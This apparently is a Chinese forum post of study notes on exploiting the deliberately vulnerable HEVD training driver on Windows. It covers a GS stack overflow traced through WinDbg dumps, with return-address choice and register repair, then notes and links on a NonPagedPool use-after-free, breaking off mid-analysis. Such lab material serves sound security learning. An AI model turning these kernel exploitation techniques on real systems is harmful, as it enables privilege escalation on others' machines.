
# Kernel Exploit Notes

```
kd> dds a186f7f0
ReadVirtual: a186f7f0 not properly sign extended
a186f7f0  00000000
a186f7f4  83ed3c61 nt!KeUpdateSystemTimeAssist+0x5d
a186f7f8  d3eff100
a186f7fc  000000d1
a186f800  a186fab0
a186f804  96fedbb7 HEVD!TriggerBufferOverflowStackGS+0x127 [F:\github\HackSysExtremeVulnerableDriver\Driver\HEVD\Windows\BufferOverflowStackGS.c @ 108]
a186f808  badb0d00
a186f80c  00000000
a186f810  00000000
a186f814  00000000
a186f818  00000023
a186f81c  00000023
a186f820  00000000
a186f824  00000001
a186f828  002c1004
a186f82c  00000000
a186f830  a186faa0
a186f834  00000030
a186f838  a186faa8
a186f83c  002c1000
a186f840  00000000
a186f844  a186f860
a186f848  00000000
a186f84c  83e8d7f3 nt!memcpy+0x33
a186f850  00000008
a186f854  00010216
a186f858  88264268
a186f85c  881bbbf8
a186f860  a186fab0
a186f864  96fedbc8 HEVD!TriggerBufferOverflowStackGS+0x138 [F:\github\HackSysExtremeVulnerableDriver\Driver\HEVD\Windows\BufferOverflowStackGS.c @ 108]
a186f868  a186f894
a186f86c  002c0dec
......
a186fa94  41414141
a186fa98  42424242
a186fa9c  43434343
a186faa0  44444444
a186faa4  01373890
a186faa8  f406e31a
a186faac  00000000
a186fab0  a186fad4
a186fab4  96feda76 HEVD!BufferOverflowStackGSIoctlHandler+0x76
a186fab8  002c0dec
a186fabc  00000218
a186fac0  00000001
a186fac4  c0000001
a186fac8  00000218
a186facc  00000000
a186fad0  002c0dec
a186fad4  a186fafc
```

返回地址选择 `HEVD!BufferOverflowStackGSIoctlHandler+0x76`

### 进入调用之前

```
kd> r
eax=883c0f48 ebx=00000000 ecx=00000218 edx=000f0dec esi=87112dd0 edi=882ac4f8
eip=97feba69 esp=934f2ac0 ebp=934f2ad4 iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
HEVD!BufferOverflowStackGSIoctlHandler+0x69:
97feba69 8b55f4          mov     edx,dword ptr [ebp-0Ch] ss:0010:934f2ac8=00000218
kd> r
eax=000f0dec ebx=00000000 ecx=00000218 edx=00000218 esi=87112dd0 edi=882ac4f8
eip=97feba71 esp=934f2ab8 ebp=934f2ad4 iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
HEVD!BufferOverflowStackGSIoctlHandler+0x71:
97feba71 e81a000000      call    HEVD!TriggerBufferOverflowStackGS (97feba90)
kd> r
eax=00000000 ebx=00000000 ecx=01313890 edx=83ebb636 esi=00000000 edi=00000000
eip=97feba76 esp=934f2ac0 ebp=934f2ad4 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
HEVD!BufferOverflowStackGSIoctlHandler+0x76:
97feba76 8945f0          mov     dword ptr [ebp-10h],eax ss:0010:934f2ac4=c0000001
```

经过对比，需要修复的寄存器有`esi`和`edi`。

```
esi=88486490 edi=882fe038
kd> r esp
esp=960b70f8
```

使用`KReClassEx`很快可以定位到

![](https://attach.52pojie.cn/forum/202401/23/101255j92i12iezmhez1tq.png)

Untitled 18.png (46.52 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2MnxlMjU2MjY1MnwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2MnxlMjU2MjY1MnwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:12 上传

修改`shellcode`

![](https://attach.52pojie.cn/forum/202401/23/101257ge3uywe8m2ehfalx.png)

Untitled 19.png (50.75 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2M3wwYTE1NTNjNXwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2M3wwYTE1NTNjNXwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:12 上传

测试

```
bu HEVD!TriggerBufferOverflowStackGS
```

Enjoy it! 🙂

![](https://attach.52pojie.cn/forum/202401/23/101259gvi6vxpa7v3xtthv.png)

Untitled 20.png (87.22 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2NHw1ZGRhNmZhN3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2NHw1ZGRhNmZhN3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:12 上传

## NonPagedPool Use After Free

`adjacent` 相邻

`stale object pointer` 过时对象指针

控制堆块布局

[//fuzzysecurity.com/tutorials/expDev/20.html" target="_blank" rel="noopener noreferrer nofollow"](https://fuzzysecurity.com/tutorials/expDev/20.html:rel="nofollow noopener" href="https)

[//fuzzysecurity.com/tutorials/expDev/19.html" target="_blank" rel="noopener noreferrer nofollow"](https://fuzzysecurity.com/tutorials/expDev/19.html:rel="nofollow noopener" href="https)

[//rootkits.xyz/blog/2017/11/kernel-pool-overflow/" target="_blank" rel="noopener noreferrer nofollow"](https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/:rel="nofollow noopener" href="https)

[//h0mbre.github.io/HEVD_Pool_Overflow_32bit/#" target="_blank" rel="noopener noreferrer nofollow"](https://h0mbre.github.io/HEVD_Pool_Overflow_32bit/#:rel="nofollow noopener" href="https)

[//h0mbre.github.io/page5/" target="_blank" rel="noopener noreferrer nofollow"](https://h0mbre.github.io/page5/:rel="nofollow noopener" href="https)

[//mdanilor.github.io/posts/hevd-2/" target="_blank" rel="noopener noreferrer nofollow"](https://mdanilor.github.io/posts/hevd-2/:rel="nofollow noopener" href="https)

`UseUaFObjectNonPagedPoolIoctlHandler`

`FreeUaFObjectNonPagedPool`

`AllocateFakeObject`

Derandomize the Non-Paged Pool

[//rootkits.xyz/blog/2018/04/kernel-use-after-free/" target="_blank" rel="noopener noreferrer nofollow"](https://rootkits.xyz/blog/2018/04/kernel-use-after-free/:rel="nofollow noopener" href="https)

### Allocating the UAF Object in the Pool

Our real allocation size in the pool is `0x60` bytes.

![](https://attach.52pojie.cn/forum/202401/23/101301if9959mmd9fmw9aq.png)

Untitled 21.png (53.17 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2NXw5MWY5NTZkMnwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2NXw5MWY5NTZkMnwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:13 上传

然后有一个全局变量保存了该指针

```
kd> dd g_UseAfterFreeObjectNonPagedPool L1
8ae64014  8862be88
```

即使是释放内存池后，该全局变量仍然持有该野指针。

![](https://attach.52pojie.cn/forum/202401/23/101303h5431r4z9l1zn9rt.png)

Untitled 22.png (70.66 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2Nnw0MzQzYjhmN3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2Nnw0MzQzYjhmN3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:13 上传

### Allocating a Fake Object

`AllocateFakeObjectNonPagedPool` 这个函数能构造一个假的对象，用于控制里面的内容。

![](https://attach.52pojie.cn/forum/202401/23/101305udainuxizm63xv3k.png)

Untitled 23.png (59.75 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY3MTk2N3w1ZGVjZDA3NHwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2N3w1ZGVjZDA3NHwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:13 上传

可以看到构造的内容如下

![](https://attach.52pojie.cn/forum/202401/23/101307qybl86z8zfqy58my.png)

Untitled 24.png (51.02 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2OHxkMDA4ZmJkM3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2OHxkMDA4ZmJkM3wxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:13 上传

### Executing UAF Object Callback

`UseUaFObjectNonPagedPool` 提供了释放后利用的条件。

但是现在条件还不够，这个回调地址无法达到预期的值。

![](https://attach.52pojie.cn/forum/202401/23/101309tcesd1y9sqeioqbe.png)

Untitled 25.png (24.31 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY3MTk2OXw5ZmI3MjkxYXwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY3MTk2OXw5ZmI3MjkxYXwxNzkzNTcwMTAzfDE2ODA4NnwxODgzNjUw&nothumb=yes)

2024-1-23 10:13 上传

```
kd> u 0x8862BDC8
ReadVirtual: 8862bdc8 not properly sign extended
8862bdc8 48              dec     eax
ReadVirtual: 8862bdd8 not properly sign extended
8862bdc9 bc628888be      mov     esp,0BE888862h
ReadVirtual: 8862bdd9 not properly sign extended
8862bdce 628800be6288    bound   ecx,qword ptr [eax-779D4200h]
ReadVirtual: 8862bdde not properly sign extended
```
